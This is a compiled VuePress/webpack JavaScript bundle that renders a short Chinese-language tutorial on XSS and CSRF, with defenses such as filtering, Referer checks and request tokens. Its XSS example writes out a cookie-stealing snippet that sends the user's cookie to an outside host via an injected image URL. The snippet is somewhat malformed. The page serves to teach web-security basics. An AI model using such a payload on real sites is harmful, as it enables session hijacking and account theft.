(window.webpackJsonp=window.webpackJsonp||[]).push([[119],{472:function(t,s,a){"use strict";a.r(s);var r=a(42),e=Object(r.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"xss-csrf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss-csrf"}},[t._v("#")]),t._v(" XSS && CSRF")]),t._v(" "),a("h2",{attrs:{id:"_1-xss"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-xss"}},[t._v("#")]),t._v(" 1. XSS")]),t._v(" "),a("p",[t._v("XSS（Cross Site Scripting）跨站脚本攻击。")]),t._v(" "),a("p",[t._v("看起来很深奥，但是原理和简单，攻击者将script标签插入用户的浏览的web页面，csript代码会执行，这样可以获取用户的敏感信息。")]),t._v(" "),a("p",[t._v("分类：")]),t._v(" "),a("p",[t._v("反射性\n存储型\nDOM型：在url后面添加script标签内容\n反射性： 比如有个网页需要，填写一个信息并返回给用户，当我们在输入框内容写成下面内容，但返回给用户就执行这个语句了。")]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" cook "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" window"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" img "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token template-string"}},[a("span",{pre:!0,attrs:{class:"token template-punctuation string"}},[t._v("`")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('<img src="www.syte.com/get.php?cook=')]),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("${")]),t._v("cook"),a("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("}")])]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"')]),a("span",{pre:!0,attrs:{class:"token template-punctuation string"}},[t._v("`")])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\ndocument"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("img"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),a("p",[t._v("注入这个片段后执行时获取用户 cookie 并把 cookie 发送到 "),a("code",[t._v("www.syte.com")]),t._v(" 域名中。")]),t._v(" "),a("p",[t._v("在后端过滤这个script来解决这个问题，还有一个标签当img标签加载失败（img有一个onerror方法，图片加载失败时触发这个方法）也可以发送请求。")]),t._v(" "),a("h2",{attrs:{id:"_2-csrf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-csrf"}},[t._v("#")]),t._v(" 2. CSRF")]),t._v(" "),a("p",[t._v("CSRF（Cross Site Request Forgy）跨站请求伪造，是一种对网站的恶意利用。")]),t._v(" "),a("p",[t._v("举个例子，当你在一个网站上登陆成功以后，攻击者在你登陆的网站上生成一个点击的按钮或连接，比如点击抽奖等。当你点击以后，以你的名义（你登陆后发送请求时，请求会带上cookie来确认你身份）向服务器发送而已请求，比如修改你的账号密码。")]),t._v(" "),a("p",[t._v("csrf")]),t._v(" "),a("p",[t._v("要完成一次CSRF攻击，受害者必须依次完成两个步骤：")]),t._v(" "),a("p",[t._v("1.登录受信任网站A，并在本地生成Cookie。")]),t._v(" "),a("p",[t._v("2.在不登出A的情况下，访问危险网站B。")]),t._v(" "),a("p",[t._v("如何让防范？")]),t._v(" "),a("p",[t._v("验证 HTTP Referer 字段\n在请求地址中添加 token 并验证")]),t._v(" "),a("comment-comment")],1)}),[],!1,null,null,null);s.default=e.exports}}]);